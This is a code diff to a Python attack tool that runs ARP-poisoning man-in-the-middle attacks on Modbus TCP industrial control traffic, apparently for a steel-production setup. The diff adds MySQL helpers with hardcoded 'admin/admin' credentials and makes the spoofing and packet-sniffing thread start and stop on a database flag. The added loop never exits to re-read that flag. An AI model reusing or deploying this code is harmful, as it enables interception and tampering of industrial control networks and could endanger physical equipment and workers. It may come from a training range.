@@ -3,13 +3,21 @@ from pymodbus.client.sync import ModbusTcpClient
 import os
 import time
 import threading
+import mysql.connector
 import struct
 import binascii
 from scapy.layers.inet import TCP, IP
+from mysql.connector import Error, cursor
 from scapy.layers.l2 import ARP, getmacbyip, Ether
 
 
-
+db_config = {
+    "host": "10.4.1.184",      # MySQL 服务器地址
+    "user": "admin",           # 数据库用户名
+    "password": "admin",       # 数据库密码
+    "database": "renren_fast",  # 数据库名
+    "port": 3306              # 指定 MySQL 端口
+}
 def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
     """恢复 ARP 表"""
     print("[INFO] 恢复 ARP 表...")
@@ -22,6 +30,199 @@ def disable_ip_forwarding():
     """禁用 IP 转发"""
     with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
         f.write('0')
+
+
+def connect_to_database():
+    """连接到 MySQL 数据库"""
+    try:
+        connection = mysql.connector.connect(
+            host=db_config['host'],
+            user=db_config['user'],
+            password=db_config['password'],
+            database=db_config['database']
+        )
+        if connection.is_connected():
+            print("成功连接到数据库")
+            return connection
+    except Error as e:
+        print(f"连接数据库时出错: {e}")
+        return None
+
+
+def close_connection(connection):
+    """关闭数据库连接"""
+    if connection.is_connected():
+        connection.close()
+        print("数据库连接已关闭")
+
+
+def read_data_from_db(connection):
+    """从数据库中wlgj_wyk读取温度、压力、空气质量和loag"""
+    try:
+        cursor = connection.cursor()
+
+        # 执行查询
+        query = """SELECT temperature, pressure, air_quality, loag
+                   FROM wlgj_wyk
+                   LIMIT 1"""  # 假设只读取一条记录，可以根据需要调整
+
+        cursor.execute(query)
+        result = cursor.fetchone()  # 获取查询结果（返回一个元组）
+
+        if result:
+            temperature, pressure, air_quality, loag = result
+            print(f"读取的数据: 温度={temperature}, 压力={pressure}, 空气质量={air_quality}, loag={loag}")
+            return temperature, pressure, air_quality, loag
+        else:
+            print("没有找到数据")
+            return None
+
+    except Error as e:
+        print(f"读取数据时出错: {e}")
+        return None
+    finally:
+        cursor.close()  # 关闭游标
+
+def read_data_from_db_tgzm(connection):
+    """从数据库中获取id=1的记录"""
+    try:
+        cursor = connection.cursor()
+        query = """SELECT iron_water, steel_plate, roller, mold, conveyor_belt1, conveyor_belt2, loag
+                      FROM wlgj_read_tgzm
+                      WHERE id = 1
+                      LIMIT 1"""
+        cursor.execute(query)
+        result = cursor.fetchone()  # 获取一行数据
+        if result:
+            iron_water, steel_plate, roller, mold, conveyor_belt1, conveyor_belt2, loag = result
+            print(
+                f"读取的数据: 铁水={iron_water}, 钢板={steel_plate}, 轧辊={roller}, 模具={mold}, 传送带1={conveyor_belt1}, 传送带2={conveyor_belt2}, loag={loag}")
+            return iron_water, steel_plate, roller, mold, conveyor_belt1, conveyor_belt2, loag
+        else:
+            print("没有找到id=1的记录")
+            return None
+    except Error as e:
+        print(f"查询数据时出错: {e}")
+        return None
+    finally:
+        cursor.close()
+
+def insert_data_into_db(connection, temperature, pressure, air_quality):
+    """将新的传感器数据插入到表中"""
+    try:
+        cursor = connection.cursor()
+
+        # 插入数据
+        query_insert = """INSERT INTO sensor_readings (temperature, pressure, air_quality)
+                          VALUES (%s, %s, %s)"""
+        cursor.execute(query_insert, (temperature, pressure, air_quality))
+
+        connection.commit()  # 提交事务
+        print(f"成功插入数据: 温度={temperature}, 压力={pressure}, 空气质量={air_quality}")
+
+    except Error as e:
+        print(f"插入数据时出错: {e}")
+    finally:
+        cursor.close()  # 关闭游标
+
+
+def update_data_in_db(connection, temperature, pressure, air_quality):
+    """更新主键为id=1的记录"""
+    try:
+        # 检查是否存在 id=1 的记录
+        cursor = connection.cursor()
+        query = """UPDATE sensor_readings
+                           SET temperature = %s, pressure = %s, air_quality = %s
+                           WHERE id = 1"""
+        cursor.execute(query, (temperature, pressure, air_quality))
+        connection.commit()  # 提交事务
+        if cursor.rowcount > 0:
+            print(f"成功更新数据: 温度={temperature}, 压力={pressure}, 空气质量={air_quality}")
+        else:
+            print("没有找到id=1的记录进行更新")
+    except Error as e:
+        print(f"更新数据时出错: {e}")
+    finally:
+        cursor.close()  # 关闭游标
+
+
+def insert_data_into_db_tgzm(connection, iron_water, steel_plate, roller, mold, conveyor_belt1, conveyor_belt2):
+    """向 wlgj_print_tgzm 表中插入6个值及 id"""
+    try:
+        cursor = connection.cursor()
+        query = """INSERT INTO wlgj_print_tgzm (iron_water, steel_plate, roller, mold, conveyor_belt1, conveyor_belt2)
+                       VALUES (%s, %s, %s, %s, %s, %s)"""
+        cursor.execute(query, (iron_water, steel_plate, roller, mold, conveyor_belt1, conveyor_belt2))
+        connection.commit()  # 提交事务
+        print("数据插入成功")
+    except Error as e:
+        print(f"插入数据时出错: {e}")
+    finally:
+        cursor.close()
+
+def print_data_tgzm(a1, a2, a3, a4, a5, a6):
+    """保存数据"""
+    # 连接数据库
+    connection = connect_to_database()
+    if not connection:
+        return
+    insert_data_into_db_tgzm(connection, a1, a2, a3, a4, a5, a6)
+    # 关闭连接
+    close_connection(connection)
+def print_data(b1, b2, b3):
+    """保存数据"""
+    # 连接数据库
+    connection = connect_to_database()
+    if not connection:
+        return
+    insert_data_into_db(connection, b1, b2, b3)
+    # 关闭连接
+    close_connection(connection)
+
+def read_data_tgzm():
+    """读取数据"""
+    connection = connect_to_database()
+    if not connection:
+        return
+    a1, a2, a3, a4, a5, a6, loag = read_data_from_db_tgzm(connection)
+    # 关闭连接
+    close_connection(connection)
+    return a1, a2, a3, a4, a5, a6, loag
+def read_data():
+    """读取数据"""
+    connection = connect_to_database()
+    if not connection:
+        return
+    b1, b2, b3, loag = read_data_from_db(connection)
+    # 关闭连接
+    close_connection(connection)
+    return b1, b2, b3, loag
+
+
+def read_arp_value():
+    """读取wlgj_qidong表中id=1的arp值"""
+    # 连接到数据库
+    connection = connect_to_database()
+    if not connection:
+        return None  # 如果连接失败，返回None
+
+    try:
+        # 使用SQL语句查询id=1的arp字段的值
+        query = "SELECT arp FROM wlgj_qidong WHERE id = 1"
+        cursor = connection.cursor()
+        cursor.execute(query)
+
+        # 获取查询结果
+        result = cursor.fetchone()  # 获取一行结果
+        if result:
+            arp_value = result[0]  # arp字段的值
+        else:
+            arp_value = None  # 如果没有找到结果，返回None
+
+        return arp_value
+    finally:
+        # 关闭连接
+        close_connection(connection)
 
 
 def send_arp_poison(target_ip, target_mac, gateway_ip, attacker_mac, iface):
@@ -278,6 +479,10 @@ def packet_callback(packet):
         print(f"[ERROR] 处理包时出错: {e}")
 
 
+# 初始化ARP变量
+arp1 = 0
+arp2 = 0
+capture_thread = None  # 用于存储捕获线程的引用
 def main():
     # 配置相关信息
     global target_ip, gateway_ip
@@ -304,30 +509,64 @@ def main():
     print(f"[INFO] 网关 IP: {gateway_ip} ({gateway_mac})")
     print(f"[INFO] 攻击者 MAC: {attacker_mac}")
 
-    # 启动一个线程捕获目标设备和网关之间的 Modbus TCP 流量
-    filter = f"ether dst {attacker_mac} and tcp port 502"
-    capture_thread = threading.Thread(
-        target=lambda: sniff(iface=iface, filter=filter, prn=packet_callback, store=False))
-    capture_thread.daemon = True  # 设置为守护线程，这样主线程退出时它也会自动结束
-    capture_thread.start()
+    global arp1, arp2, capture_thread
 
     try:
-        disable_ip_forwarding()
-        print("[INFO] 开始 ARP 欺骗攻击 ...")
-
         while True:
-            # 持续发送伪造的 ARP 包
-            send_arp_poison(target_ip, target_mac, gateway_ip, attacker_mac, iface)
-            send_arp_poison(gateway_ip, gateway_mac, target_ip, attacker_mac, iface)
-            # 检查目标设备的 ARP 表是否已经修改
-            observed_mac = getmacbyip(target_ip)
-            if observed_mac != gateway_mac:
-                print(f"[INFO] ARP 已被篡改: {observed_mac}")
-            time.sleep(2)
+            # 从数据库中读取最新的ARP值
+            arp2 = read_arp_value()  # 假设read_arp_value()返回一个0或1的值
+
+            if arp1 == 0 and arp2 == 0:
+                # 如果arp1=0，arp2=0，不做任何处理
+                pass
+            elif arp1 == 1 and arp2 == 1:
+                # 如果arp1=1，arp2=1，不做任何处理
+                pass
+            elif arp1 == 0 and arp2 == 1:
+                # 如果arp1=0，arp2=1，启动线程并开始ARP欺骗
+                if capture_thread is None or not capture_thread.is_alive():
+                    # 启动一个线程捕获Modbus TCP流量
+                    print("[INFO] 启动 Modbus TCP 捕获线程")
+                    capture_thread = threading.Thread(
+                        target=lambda: sniff(iface=iface, filter=f"ether dst {attacker_mac} and tcp port 502",
+                                             prn=packet_callback, store=False)
+                    )
+                    capture_thread.daemon = True  # 设置为守护线程
+                    capture_thread.start()
+
+                print("[INFO] 开始 ARP 欺骗攻击 ...")
+                while True:
+                    # 持续发送伪造的 ARP 包
+                    send_arp_poison(target_ip, target_mac, gateway_ip, attacker_mac, iface)
+                    send_arp_poison(gateway_ip, gateway_mac, target_ip, attacker_mac, iface)
+
+                    # 检查目标设备的 ARP 表是否已经修改
+                    observed_mac = getmacbyip(target_ip)
+                    if observed_mac != gateway_mac:
+                        print(f"[INFO] ARP 已被篡改: {observed_mac}")
+                    time.sleep(2)
+
+            elif arp1 == 1 and arp2 == 0:
+                # 如果arp1=1，arp2=0，关闭线程并恢复ARP欺骗
+                if capture_thread and capture_thread.is_alive():
+                    print("[INFO] 停止 Modbus TCP 捕获线程")
+                    # 由于线程是守护线程，主线程退出时它会被自动终止，但这里你也可以手动终止
+                    capture_thread.join()  # 等待线程结束
+                    capture_thread = None  # 清空线程对象，准备下次创建新线程
+
+                print("[INFO] 停止 ARP 欺骗攻击，恢复 ARP 表 ...")
+                restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
+                disable_ip_forwarding()
+
+            # 更新arp1为arp2，为下次比较做准备
+            arp1 = arp2
+            time.sleep(1)  # 每秒更新一次arp2
 
     except KeyboardInterrupt:
         # 捕获 Ctrl+C，停止攻击
         print("[INFO] 停止攻击，恢复 ARP 表 ...")
+        if capture_thread and capture_thread.is_alive():
+            capture_thread.join()  # 等待线程结束
         restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
         disable_ip_forwarding()
 
